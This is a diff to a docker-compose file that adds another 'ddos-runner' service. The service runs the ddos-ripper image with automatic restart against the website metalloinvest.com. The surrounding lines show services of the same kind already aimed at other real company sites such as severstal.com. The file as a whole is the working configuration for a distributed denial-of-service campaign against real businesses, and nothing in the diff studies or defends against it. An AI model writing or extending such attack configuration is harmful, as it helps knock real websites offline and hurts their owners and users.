@@ -40,6 +40,10 @@ services:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
     command: https://www.severstal.com
+  ddos-runner-11:
+    image: nitupkcuf/ddos-ripper:latest
+    restart: always
+    command: https://www.metalloinvest.com
   ddos-runner-12:
     image: nitupkcuf/ddos-ripper:latest
     restart: always
